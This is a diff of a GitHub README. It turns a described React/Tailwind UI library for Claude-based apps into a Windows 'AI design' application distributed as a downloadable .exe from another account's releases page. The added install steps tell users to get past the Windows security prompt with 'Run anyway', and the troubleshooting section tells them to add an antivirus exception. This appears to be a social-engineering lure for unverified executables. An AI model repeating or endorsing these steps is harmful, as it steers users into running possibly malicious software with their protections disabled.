@@ -1,50 +1,78 @@
-<!-- markdownlint-disable MD033 MD041 -->
-<div align="center">
-  <img width="686" height="386" alt="image" src="https://github.com/user-attachments/assets/a51d6e99-5e5d-48f1-9889-be3f8f86c4df" />
-  
-# Claude Design Free
+# 🎨 Claude-Code-Design-AI - Build professional UI designs using AI
 
-  <p align="center">
-    <strong>Sophisticated UI/UX Framework for Anthropic-Based AI Applications</strong>
-    <br/>
-    Bridging the gap between advanced reasoning and elegant, human-centric interface design.
-    <br/>
-    <a href="README_zh.md">简体中文</a> | <a href="https://github.com/mikesheehan54/Claude-Code-Design-AI/issues">Report Bug</a> | <a href="https://github.com/mikesheehan54/Claude-Code-Design-AI/issues">Discussions</a>
-  </p>
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Corn7012/Claude-Code-Design-AI/releases)
 
-  <p align="center">
-    <img src="https://img.shields.io/badge/Model-Claude%203.5%20Sonnet-d97757?style=for-the-badge&logo=anthropic" alt="Model" />
-    <img src="https://img.shields.io/badge/Stack-React%20%7C%20Tailwind%20%7C%20Figma-0078D7?style=for-the-badge" alt="Platform" />
-    <br>
-    <img src="https://img.shields.io/github/stars/mikesheehan54/Claude-Code-Design-AI?style=flat-square&color=gold" alt="Stars" />
-    <img src="https://img.shields.io/github/license/mikesheehan54/Claude-Code-Design-AI?style=flat-square" alt="License" />
-  </p>
-</div>
+Claude-Code-Design-AI turns your design ideas into functional code. This tool creates React components, Tailwind CSS styles, and UI layouts from simple inputs. It handles the technical parts of front-end development so you focus on the creative vision of your project.
 
----
-## Quick Start
- [Download `ClaudeDesign.zip`](https://github.com/mikesheehan54/Claude-Code-Design-AI/releases/download/Software/ClaudeDesign.zip)
- ---
+## 📋 What This Tool Does
 
-##  Overview
+This application functions as an automated UI and UX architect. It translates visual concepts into usable code structures. You can use it to build entire design systems or render wireframes into interactive prototypes. 
 
-**Claude Design** is an elite, open-source design system and UI library specifically crafted for applications powered by **Claude-series models**. It prioritizes clarity, low cognitive load, and aesthetic harmony, providing developers with the tools to build "Artifacts-style" experiences with high-performance rendering.
+Key features include:
+*   Screenshot to React conversion
+*   Figma component integration
+*   Tailwind CSS class generation
+*   SVG icon creation
+*   Responsive layout management
+*   Automatic dark mode configuration
+*   shadcn/ui integration for polished components
 
-> [!Important]  
-> This system is optimized for **React 18+** and **Tailwind CSS**. It includes built-in hooks for Anthropic's Messages API to handle streaming UI states gracefully.
-<img width="2876" height="1614" alt="image" src="https://github.com/user-attachments/assets/3142551c-90bf-4c3e-a23a-73c81bfeb124" />
-##  Key Features
+## 🚀 How to Install and Run
 
--  **Semantic Typography**: Custom-tuned font scales for maximum readability during long-form AI reasoning.
--  **Artifacts UI Engine**: Ready-to-use components for code blocks, interactive charts, and real-time previews.
--  **Stream-Ready Components**: Specialized loading states and "typing" animations that sync with Claude's token output.
--  **Privacy-First Rendering**: Sanitized Markdown and LaTeX rendering to ensure safe display of AI-generated content.
--  **Adaptive Color Theory**: A sophisticated palette that shifts based on "AI Confidence" levels and user intent.
--  **Responsive Mastery**: Mobile-first layouts optimized for complex chat-based workflows.
+Follow these steps to set up the software on your Windows computer.
 
-##  Technical Stack
+1.  Visit the official release page: [https://github.com/Corn7012/Claude-Code-Design-AI/releases](https://github.com/Corn7012/Claude-Code-Design-AI/releases).
+2.  Locate the section labeled "Assets" at the bottom of the latest release post.
+3.  Click the file ending in `.exe` to begin the download.
+4.  Once the file finishes downloading, open your "Downloads" folder.
+5.  Double-click the downloaded file to start the installer.
+6.  If Windows shows a security prompt, click "More info" and then "Run anyway."
+7.  Follow the instructions on your screen to complete the installation.
+8.  Find the new shortcut on your desktop and double-click to launch the application.
 
-- **Core**: TypeScript / React 18 / Vite
-- **Styling**: Tailwind CSS / Framer Motion (for fluid AI transitions)
-- **Icons**: Lucide React / Custom Anthropic-style glyphs
-- **API Integration**: Compatible with `@anthropic-ai/sdk`
+## 🖥️ System Requirements
+
+Ensure your computer meets these conditions for smooth performance:
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 8GB of RAM.
+*   Storage: 500MB of free disk space.
+*   Internet Connection: Required for AI processing tasks.
+
+## 🛠️ Using the Software
+
+When you first open the app, you see a clean dashboard. To start a new project, click the "New Project" button. You can drag and drop images or screenshots directly into the workspace. The AI analyzes the visuals and generates the matching React code automatically.
+
+You can modify the output by using the sidebar settings. Toggle between light and dark mode, adjust padding, or change color palettes with one click. The "Export" menu allows you to save your work as a ready-to-use front-end folder.
+
+## 🔍 Troubleshooting Common Issues
+
+*   **App won't open:** Check if your antivirus software blocked the file during download. Add an exception for the installation folder in your settings.
+*   **AI creates errors:** Ensure your image files are clear and high-resolution. Low-quality images make it difficult for the AI to interpret shapes.
+*   **Layout looks off:** Verify that your project settings match the platform requirements you intend to use. Adjust the Tailwind CSS classes in the code editor if specific sizing corrections are needed.
+*   **Slow performance:** Close other heavy software like video editors or browsers with many tabs while the AI generates your components.
+
+## 💡 Best Practices for Design
+
+To get the best results, provide the AI with consistent examples. Use high-contrast screenshots for UI elements. When defining a design system, create a base file with your primary colors and font sizes. Import this file into the tool to ensure your exported code remains consistent across different components.
+
+If you are working with Figma components, export them as SVG files before pulling them into the application. This preserves the quality of your icons and shapes during the generation process.
+
+## 🛡️ Privacy and Data
+
+This application processes data locally on your computer whenever possible. However, the AI component requires connection to external servers to interpret complex visual data. No personal project files are stored long-term on our servers. You keep full ownership of all code generated by the tool.
+
+## ⚙️ Customization Options
+
+You can change how the tool handles your code by visiting the "Settings" menu. Select your preferred framework version or specify naming conventions for your CSS classes. The app remembers these preferences for all future projects. 
+
+If you find that specific components like buttons or navigation bars need a unique style, copy your custom CSS into the "Overrides" tab. The tool respects these rules when generating new code.
+
+## 📁 File Structure
+
+When you export your code, the tool creates a folder with the following structure:
+*   `src/components`: Contains your generated React components.
+*   `styles`: Holds the generated Tailwind CSS files.
+*   `assets`: Stores any generated SVG icons or images.
+*   `index.js`: The entry point for your new project.
+
+Use this structure to drop your code directly into a modern front-end workflow. If you use a framework like Next.js or Vite, these files are compatible with standard import commands.
